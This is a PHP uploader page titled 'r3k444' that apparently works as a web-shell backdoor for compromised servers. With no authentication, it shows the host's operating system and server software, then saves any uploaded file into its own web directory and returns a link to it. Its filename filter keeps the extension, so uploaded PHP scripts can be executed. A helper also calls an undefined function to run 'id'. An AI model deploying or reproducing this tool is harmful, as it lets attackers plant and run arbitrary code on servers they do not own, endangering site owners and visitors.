<?php
define("UPLOAD_DIR", "./");
define("ERROR", "STOP! Error time! I have no idea what caused this." );

function getsystem()
{
	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};	

function getserver()
{
	return getenv("SERVER_SOFTWARE");
};


function getuser()
{
$out = get_current_user();	
	if($out!="SYSTEM")
		{
			if(($out=ex('id'))==''){$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();};
		}
return $out;
};


// The upload form
if ($_SERVER["REQUEST_METHOD"] == "GET") {
?>


<style>
body {
font-family: Arial, sans-serif;
}

form {
max-width: 400px;
margin: 0 auto;
padding: 20px;
border: 1px solid #ccc;
background-color: #f9f9f9;
border-radius: 5px;
}

label {
display: block;
margin-bottom: 5px;
font-weight: bold;
}

input[type="text"], input[type="file"] {
width: 95%;
padding: 10px;
margin-bottom: 10px;
border: 1px solid #ccc;
border-radius: 5px;
}

input[type="submit"] {
background-color: #007bff;
color: white;
padding: 10px 20px;
border: none;
border-radius: 5px;
cursor: pointer;
}

input[type="submit"]:hover {
background-color: #0056b3;
}

table {
width: 100%;
border-collapse: collapse;
margin-top: 20px;
}

th, td {
border: 1px solid #ddd;
padding: 8px;
text-align: left;
}

th {
background-color: #f2f2f2;
}


</style>

 <br/>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>r3k444</title>
</head>
<body>
 
 <center>
 
<span>
		<p dir="ltr" align="center"><font color="#008000">
		<font size="4">
		<a bookmark="minipanel" style="font-weight: 700; font-family: Trebuchet MS; text-decoration: none; color: #009900" href=""><?php echo php_uname() ; ?></a></font></font><a bookmark="minipanel" style="font-weight: 700; color: #008000; font-family: Trebuchet MS; text-decoration: none"><font size="4">
		</font>
</a>
		</p>
 
</span>
<span>
		<p dir="ltr" align="center"><font color="#008000">
		<font size="4">
		<a bookmark="minipanel" style="font-weight: 700; font-family: Trebuchet MS; text-decoration: none; color: #009900" href=""><?php echo getserver();?></a></font></font><a bookmark="minipanel" style="font-weight: 700; color: #008000; font-family: Trebuchet MS; text-decoration: none"><font size="4">
		</font>
</a>
		</p>
 
</span>
 <form action="" method="POST" enctype="multipart/form-data">



<br> 


<input type="file" class="form-control upload-btn" placeholder="File" name="myFile" id="myFile" multiple/>
<br> 
<input type="submit" value="Upload"/>
<?php
}
// File upload action
else if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];
    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "STOP! Error time! I have no idea what caused this.";
         
    }
    // Check the filename is safe
    $name = preg_replace("/[^A-Z0-9._-]/i", "_", $myFile["name"]);

    // Grab file from the temp dir
    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "Sorry, Error time!";
         
    }
	else{
	echo " <br/> ";
    echo "Congratulations! File <a href=$name>Click</a> Uploaded Successfully";
	}
	
	
	
}	
	
?>


</form>

		</center>
 

</body>
</html>





